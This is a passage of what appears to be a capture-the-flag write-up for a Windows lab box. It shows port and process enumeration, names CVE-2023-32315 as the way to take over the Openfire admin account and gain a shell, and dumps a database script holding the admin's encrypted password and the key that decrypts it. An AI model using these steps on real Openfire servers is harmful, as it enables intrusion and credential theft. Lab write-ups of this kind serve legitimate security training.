</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5263         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5269         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5270         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5275         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:5276         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:7070         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:7443         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       2996
</span></span><span style="display:flex;"><span>  TCP    [::]:135               [::]:0                 LISTENING       896
</span></span><span style="display:flex;"><span>  TCP    [::]:445               [::]:0                 LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    [::]:5985              [::]:0                 LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    [::]:47001             [::]:0                 LISTENING       4
</span></span><span style="display:flex;"><span>  TCP    [::]:49664             [::]:0                 LISTENING       660
</span></span><span style="display:flex;"><span>  TCP    [::]:49665             [::]:0                 LISTENING       528
</span></span><span style="display:flex;"><span>  TCP    [::]:49666             [::]:0                 LISTENING       728
</span></span><span style="display:flex;"><span>  TCP    [::]:49667             [::]:0                 LISTENING       1564
</span></span><span style="display:flex;"><span>  TCP    [::]:49668             [::]:0                 LISTENING       652
</span></span></code></pre></div></li>
<li>
<p><strong>Running Services on Local Interface</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>get-process -id 2996
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
</span></span><span style="display:flex;"><span>-------  ------    -----      -----     ------     --  -- -----------                                                  
</span></span><span style="display:flex;"><span>    967      87   318252     212752              2996   0 openfire-service  
</span></span></code></pre></div></li>
<li>
<p><strong>Users on the Local Machine</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>User accounts for \\SOLARLAB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>Administrator            blake                    DefaultAccount           
</span></span><span style="display:flex;"><span>Guest                    openfire                 WDAGUtilityAccount 
</span></span></code></pre></div></li>
<li>
<p><strong>Openfire 4.7.4</strong></p>
<p>Openfire is running on port 9090 let&rsquo;s use chisel to forward the port.</p>
<p>Openfire version was 4.7.4 vulnerable to Admin Account Takeover. <a href="https://github.com/miko550/CVE-2023-32315">PoC</a></p>
<p>After successful exploitation got a shell as <code>openfire</code>. Testing credentials using the <code>users.db</code> I found a match.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>openfire:********
</span></span></code></pre></div><p>Found a script inside embedded-db folder.</p>
<p><strong>openfire.properties</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>SET DATABASE UNIQUE NAME HSQLDB8BDD3B2742
</span></span><span style="display:flex;"><span>SET DATABASE GC 0
</span></span><span style="display:flex;"><span>SET DATABASE DEFAULT RESULT MEMORY ROWS 0
</span></span><span style="display:flex;"><span>SET DATABASE EVENT LOG LEVEL 0
</span></span><span style="display:flex;"><span>SET DATABASE TRANSACTION CONTROL LOCKS
</span></span><span style="display:flex;"><span>SET DATABASE DEFAULT ISOLATION LEVEL READ COMMITTED
</span></span><span style="display:flex;"><span>SET DATABASE TRANSACTION ROLLBACK ON CONFLICT TRUE
</span></span><span style="display:flex;"><span>SET DATABASE TEXT TABLE DEFAULTS &#39;&#39;
</span></span><span style="display:flex;"><span>SET DATABASE SQL NAMES FALSE
</span></span><span style="display:flex;"><span>SET DATABASE SQL REFERENCES FALSE
</span></span><span style="display:flex;"><span>SET DATABASE SQL SIZE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL TYPES FALSE
</span></span><span style="display:flex;"><span>SET DATABASE SQL TDC DELETE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL TDC UPDATE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL CONCAT NULLS TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL UNIQUE NULLS TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL CONVERT TRUNCATE TRUE
</span></span><span style="display:flex;"><span>SET DATABASE SQL AVG SCALE 0
</span></span><span style="display:flex;"><span>SET DATABASE SQL DOUBLE NAN TRUE
</span></span><span style="display:flex;"><span>SET FILES WRITE DELAY 1
</span></span><span style="display:flex;"><span>SET FILES BACKUP INCREMENT TRUE
</span></span><span style="display:flex;"><span>SET FILES CACHE SIZE 10000
</span></span><span style="display:flex;"><span>SET FILES CACHE ROWS 50000
</span></span><span style="display:flex;"><span>SET FILES SCALE 32
</span></span><span style="display:flex;"><span>SET FILES LOB SCALE 32
</span></span><span style="display:flex;"><span>SET FILES DEFRAG 0
</span></span><span style="display:flex;"><span>SET FILES NIO TRUE
</span></span><span style="display:flex;"><span>SET FILES NIO SIZE 256
</span></span><span style="display:flex;"><span>SET FILES LOG TRUE
</span></span><span style="display:flex;"><span>SET FILES LOG SIZE 20
</span></span><span style="display:flex;"><span>CREATE USER SA PASSWORD DIGEST &#39;d41d8cd98f00b204e9800998ecf8427e&#39;
</span></span><span style="display:flex;"><span>ALTER USER SA SET LOCAL TRUE
</span></span><span style="display:flex;"><span>CREATE SCHEMA PUBLIC AUTHORIZATION DBA
</span></span><span style="display:flex;"><span>SET SCHEMA PUBLIC
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFUSER_CDATE_IDX ON PUBLIC.OFUSER(CREATIONDATE)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFUSERPROP(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFUSERPROP_PK PRIMARY KEY(USERNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFUSERFLAG(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,STARTTIME VARCHAR(15),ENDTIME VARCHAR(15),CONSTRAINT OFUSERFLAG_PK PRIMARY KEY(USERNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFUSERFLAG_STIME_IDX ON PUBLIC.OFUSERFLAG(STARTTIME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFUSERFLAG_ETIME_IDX ON PUBLIC.OFUSERFLAG(ENDTIME)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFOFFLINE(USERNAME VARCHAR(64) NOT NULL,MESSAGEID BIGINT NOT NULL,CREATIONDATE VARCHAR(15) NOT NULL,MESSAGESIZE INTEGER NOT NULL,STANZA VARCHAR(16777216) NOT NULL,CONSTRAINT OFOFFLINE_PK PRIMARY KEY(USERNAME,MESSAGEID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPRESENCE(USERNAME VARCHAR(64) NOT NULL,OFFLINEPRESENCE VARCHAR(16777216),OFFLINEDATE VARCHAR(15) NOT NULL,CONSTRAINT OFPRESENCE_PK PRIMARY KEY(USERNAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFROSTER(ROSTERID BIGINT NOT NULL,USERNAME VARCHAR(64) NOT NULL,JID VARCHAR(1024) NOT NULL,SUB INTEGER NOT NULL,ASK INTEGER NOT NULL,RECV INTEGER NOT NULL,NICK VARCHAR(255),STANZA VARCHAR(16777216),CONSTRAINT OFROSTER_PK PRIMARY KEY(ROSTERID))
</span></span><span style="display:flex;"><span>CREATE INDEX OFROSTER_USERNAME_IDX ON PUBLIC.OFROSTER(USERNAME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFROSTER_JID_IDX ON PUBLIC.OFROSTER(JID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFROSTERGROUPS(ROSTERID BIGINT NOT NULL,RANK INTEGER NOT NULL,GROUPNAME VARCHAR(255) NOT NULL,CONSTRAINT OFROSTERGROUPS_PK PRIMARY KEY(ROSTERID,RANK))
</span></span><span style="display:flex;"><span>CREATE INDEX OFROSTERGROUP_ROSTERID_IDX ON PUBLIC.OFROSTERGROUPS(ROSTERID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFVCARD(USERNAME VARCHAR(64) NOT NULL,VCARD VARCHAR(16777216) NOT NULL,CONSTRAINT OFVCARD_PK PRIMARY KEY(USERNAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFGROUP(GROUPNAME VARCHAR(50) NOT NULL,DESCRIPTION VARCHAR(255),CONSTRAINT OFGROUP_PK PRIMARY KEY(GROUPNAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFGROUPPROP(GROUPNAME VARCHAR(50) NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFGROUPPROP_PK PRIMARY KEY(GROUPNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFGROUPUSER(GROUPNAME VARCHAR(50) NOT NULL,USERNAME VARCHAR(100) NOT NULL,ADMINISTRATOR INTEGER NOT NULL,CONSTRAINT OFGROUPUSER_PK PRIMARY KEY(GROUPNAME,USERNAME,ADMINISTRATOR))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFID(IDTYPE INTEGER NOT NULL,ID BIGINT NOT NULL,CONSTRAINT OFID_PK PRIMARY KEY(IDTYPE))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPROPERTY(NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,ENCRYPTED INTEGER,IV CHARACTER(24),CONSTRAINT OFPROPERTY_PK PRIMARY KEY(NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFVERSION(NAME VARCHAR(50) NOT NULL,VERSION INTEGER NOT NULL,CONSTRAINT OFVERSION_PK PRIMARY KEY(NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFEXTCOMPONENTCONF(SUBDOMAIN VARCHAR(255) NOT NULL,WILDCARD INTEGER NOT NULL,SECRET VARCHAR(255),PERMISSION VARCHAR(10) NOT NULL,CONSTRAINT OFEXTCOMPONENTCONF_PK PRIMARY KEY(SUBDOMAIN))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFREMOTESERVERCONF(XMPPDOMAIN VARCHAR(255) NOT NULL,REMOTEPORT INTEGER,PERMISSION VARCHAR(10) NOT NULL,CONSTRAINT OFREMOTESERVERCONF_PK PRIMARY KEY(XMPPDOMAIN))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPRIVACYLIST(USERNAME VARCHAR(64) NOT NULL,NAME VARCHAR(100) NOT NULL,ISDEFAULT INTEGER NOT NULL,LIST VARCHAR(16777216) NOT NULL,CONSTRAINT OFPRIVACYLIST_PK PRIMARY KEY(USERNAME,NAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFPRIVACYLIST_DEFAULT_IDX ON PUBLIC.OFPRIVACYLIST(USERNAME,ISDEFAULT)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFSASLAUTHORIZED(USERNAME VARCHAR(64) NOT NULL,PRINCIPAL VARCHAR(4000) NOT NULL,CONSTRAINT OFSASLAUTHORIZED_PK PRIMARY KEY(USERNAME,PRINCIPAL))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFSECURITYAUDITLOG(MSGID BIGINT NOT NULL,USERNAME VARCHAR(64) NOT NULL,ENTRYSTAMP BIGINT NOT NULL,SUMMARY VARCHAR(255) NOT NULL,NODE VARCHAR(255) NOT NULL,DETAILS VARCHAR(16777216),CONSTRAINT OFSECURITYAUDITLOG_PK PRIMARY KEY(MSGID))
</span></span><span style="display:flex;"><span>CREATE INDEX OFSECURITYAUDITLOG_TSTAMP_IDX ON PUBLIC.OFSECURITYAUDITLOG(ENTRYSTAMP)
</span></span><span style="display:flex;"><span>CREATE INDEX OFSECURITYAUDITLOG_UNAME_IDX ON PUBLIC.OFSECURITYAUDITLOG(USERNAME)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCSERVICE(SERVICEID BIGINT NOT NULL,SUBDOMAIN VARCHAR(255) NOT NULL,DESCRIPTION VARCHAR(255),ISHIDDEN INTEGER NOT NULL,CONSTRAINT OFMUCSERVICE_PK PRIMARY KEY(SUBDOMAIN))
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCSERVICE_SERVICEID_IDX ON PUBLIC.OFMUCSERVICE(SERVICEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCSERVICEPROP(SERVICEID BIGINT NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFMUCSERVICEPROP_PK PRIMARY KEY(SERVICEID,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCROOM(SERVICEID BIGINT NOT NULL,ROOMID BIGINT NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,MODIFICATIONDATE CHARACTER(15) NOT NULL,NAME VARCHAR(50) NOT NULL,NATURALNAME VARCHAR(255) NOT NULL,DESCRIPTION VARCHAR(255),LOCKEDDATE CHARACTER(15) NOT NULL,EMPTYDATE CHARACTER(15),CANCHANGESUBJECT INTEGER NOT NULL,MAXUSERS INTEGER NOT NULL,PUBLICROOM INTEGER NOT NULL,MODERATED INTEGER NOT NULL,MEMBERSONLY INTEGER NOT NULL,CANINVITE INTEGER NOT NULL,ROOMPASSWORD VARCHAR(50),CANDISCOVERJID INTEGER NOT NULL,LOGENABLED INTEGER NOT NULL,SUBJECT VARCHAR(100),ROLESTOBROADCAST INTEGER NOT NULL,USERESERVEDNICK INTEGER NOT NULL,CANCHANGENICK INTEGER NOT NULL,CANREGISTER INTEGER NOT NULL,ALLOWPM INTEGER,FMUCENABLED INTEGER,FMUCOUTBOUNDNODE VARCHAR(255),FMUCOUTBOUNDMODE INTEGER,FMUCINBOUNDNODES VARCHAR(4000),CONSTRAINT OFMUCROOM_PK PRIMARY KEY(SERVICEID,NAME))
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCROOM_ROOMID_IDX ON PUBLIC.OFMUCROOM(ROOMID)
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCROOM_SERVICEID_IDX ON PUBLIC.OFMUCROOM(SERVICEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCROOMPROP(ROOMID BIGINT NOT NULL,NAME VARCHAR(100) NOT NULL,PROPVALUE VARCHAR(4000) NOT NULL,CONSTRAINT OFMUCROOMPROP_PK PRIMARY KEY(ROOMID,NAME))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCAFFILIATION(ROOMID BIGINT NOT NULL,JID VARCHAR(1024) NOT NULL,AFFILIATION INTEGER NOT NULL,CONSTRAINT OFMUCAFFILIATION_PK PRIMARY KEY(ROOMID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCMEMBER(ROOMID BIGINT NOT NULL,JID VARCHAR(1024) NOT NULL,NICKNAME VARCHAR(255),FIRSTNAME VARCHAR(100),LASTNAME VARCHAR(100),URL VARCHAR(100),EMAIL VARCHAR(100),FAQENTRY VARCHAR(100),CONSTRAINT OFMUCMEMBER_PK PRIMARY KEY(ROOMID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFMUCCONVERSATIONLOG(ROOMID BIGINT NOT NULL,MESSAGEID BIGINT NOT NULL,SENDER VARCHAR(1024) NOT NULL,NICKNAME VARCHAR(255),LOGTIME CHARACTER(15) NOT NULL,SUBJECT VARCHAR(255),BODY VARCHAR(16777216),STANZA VARCHAR(16777216))
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCCONVERSATIONLOG_ROOMTIME_IDX ON PUBLIC.OFMUCCONVERSATIONLOG(ROOMID,LOGTIME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCCONVERSATIONLOG_TIME_IDX ON PUBLIC.OFMUCCONVERSATIONLOG(LOGTIME)
</span></span><span style="display:flex;"><span>CREATE INDEX OFMUCCONVERSATIONLOG_MSG_ID ON PUBLIC.OFMUCCONVERSATIONLOG(MESSAGEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODE(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,LEAF INTEGER NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,MODIFICATIONDATE CHARACTER(15) NOT NULL,PARENT VARCHAR(100),DELIVERPAYLOADS INTEGER NOT NULL,MAXPAYLOADSIZE INTEGER,PERSISTITEMS INTEGER,MAXITEMS INTEGER,NOTIFYCONFIGCHANGES INTEGER NOT NULL,NOTIFYDELETE INTEGER NOT NULL,NOTIFYRETRACT INTEGER NOT NULL,PRESENCEBASED INTEGER NOT NULL,SENDITEMSUBSCRIBE INTEGER NOT NULL,PUBLISHERMODEL VARCHAR(15) NOT NULL,SUBSCRIPTIONENABLED INTEGER NOT NULL,CONFIGSUBSCRIPTION INTEGER NOT NULL,ACCESSMODEL VARCHAR(10) NOT NULL,PAYLOADTYPE VARCHAR(100),BODYXSLT VARCHAR(100),DATAFORMXSLT VARCHAR(100),CREATOR VARCHAR(1024) NOT NULL,DESCRIPTION VARCHAR(255),LANGUAGE VARCHAR(255),NAME VARCHAR(50),REPLYPOLICY VARCHAR(15),ASSOCIATIONPOLICY VARCHAR(15),MAXLEAFNODES INTEGER,CONSTRAINT OFPUBSUBNODE_PK PRIMARY KEY(SERVICEID,NODEID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODEJIDS(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,ASSOCIATIONTYPE VARCHAR(20) NOT NULL,CONSTRAINT OFPUBSUBNODEJIDS_PK PRIMARY KEY(SERVICEID,NODEID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBNODEGROUPS(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ROSTERGROUP VARCHAR(100) NOT NULL)
</span></span><span style="display:flex;"><span>CREATE INDEX OFPUBSUBNODEGROUPS_IDX ON PUBLIC.OFPUBSUBNODEGROUPS(SERVICEID,NODEID)
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBAFFILIATION(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,AFFILIATION VARCHAR(10) NOT NULL,CONSTRAINT OFPUBSUBAFFILIATION_PK PRIMARY KEY(SERVICEID,NODEID,JID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBITEM(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,CREATIONDATE CHARACTER(15) NOT NULL,PAYLOAD CLOB(1G),CONSTRAINT OFPUBSUBITEM_PK PRIMARY KEY(SERVICEID,NODEID,ID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBSUBSCRIPTION(SERVICEID VARCHAR(100) NOT NULL,NODEID VARCHAR(100) NOT NULL,ID VARCHAR(100) NOT NULL,JID VARCHAR(1024) NOT NULL,OWNER VARCHAR(1024) NOT NULL,STATE VARCHAR(15) NOT NULL,DELIVER INTEGER NOT NULL,DIGEST INTEGER NOT NULL,DIGEST_FREQUENCY INTEGER NOT NULL,EXPIRE CHARACTER(15),INCLUDEBODY INTEGER NOT NULL,SHOWVALUES VARCHAR(30) NOT NULL,SUBSCRIPTIONTYPE VARCHAR(10) NOT NULL,SUBSCRIPTIONDEPTH INTEGER NOT NULL,KEYWORD VARCHAR(200),CONSTRAINT OFPUBSUBSUBSCRIPTION_PK PRIMARY KEY(SERVICEID,NODEID,ID))
</span></span><span style="display:flex;"><span>CREATE MEMORY TABLE PUBLIC.OFPUBSUBDEFAULTCONF(SERVICEID VARCHAR(100) NOT NULL,LEAF INTEGER NOT NULL,DELIVERPAYLOADS INTEGER NOT NULL,MAXPAYLOADSIZE INTEGER NOT NULL,PERSISTITEMS INTEGER NOT NULL,MAXITEMS INTEGER NOT NULL,NOTIFYCONFIGCHANGES INTEGER NOT NULL,NOTIFYDELETE INTEGER NOT NULL,NOTIFYRETRACT INTEGER NOT NULL,PRESENCEBASED INTEGER NOT NULL,SENDITEMSUBSCRIBE INTEGER NOT NULL,PUBLISHERMODEL VARCHAR(15) NOT NULL,SUBSCRIPTIONENABLED INTEGER NOT NULL,ACCESSMODEL VARCHAR(10) NOT NULL,LANGUAGE VARCHAR(255),REPLYPOLICY VARCHAR(15),ASSOCIATIONPOLICY VARCHAR(15) NOT NULL,MAXLEAFNODES INTEGER NOT NULL,CONSTRAINT OFPUBSUBDEFAULTCONF_PK PRIMARY KEY(SERVICEID,LEAF))
</span></span><span style="display:flex;"><span>ALTER SEQUENCE SYSTEM_LOBS.LOB_ID RESTART WITH 1
</span></span><span style="display:flex;"><span>SET DATABASE DEFAULT INITIAL SCHEMA PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.SQL_IDENTIFIER TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.YES_OR_NO TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.TIME_STAMP TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CARDINAL_NUMBER TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CHARACTER_DATA TO PUBLIC
</span></span><span style="display:flex;"><span>GRANT DBA TO SA
</span></span><span style="display:flex;"><span>SET SCHEMA SYSTEM_LOBS
</span></span><span style="display:flex;"><span>INSERT INTO BLOCKS VALUES(0,2147483647,0)
</span></span><span style="display:flex;"><span>SET SCHEMA PUBLIC
</span></span><span style="display:flex;"><span>INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFUSERPROP VALUES(&#39;admin&#39;,&#39;console.rows_per_page&#39;,&#39;/session-summary.jsp=25&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,1,&#39;001700223778861&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.7.5&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,2,&#39;001700223779069&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,6,&#39;001714131992714&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.8.1&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,7,&#39;001714131993136&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,11,&#39;001715023572659&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.8.1&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,12,&#39;001715023572956&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(18,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(19,16)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(23,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(25,3)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(26,2)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(27,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;RoomStatistics.maxLifetime&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;RoomStatistics.size&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;Rooms.maxLifetime&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;Rooms.size&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.admin.className&#39;,&#39;org.jivesoftware.openfire.admin.DefaultAdminProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.auth.className&#39;,&#39;org.jivesoftware.openfire.auth.DefaultAuthProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.group.className&#39;,&#39;org.jivesoftware.openfire.group.DefaultGroupProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.lockout.className&#39;,&#39;org.jivesoftware.openfire.lockout.DefaultLockOutProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.securityAudit.className&#39;,&#39;org.jivesoftware.openfire.security.DefaultSecurityAuditProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.user.className&#39;,&#39;org.jivesoftware.openfire.user.DefaultUserProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.vcard.className&#39;,&#39;org.jivesoftware.openfire.vcard.DefaultVCardProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;update.lastCheck&#39;,&#39;1715023572956&#39;,0,NULL)
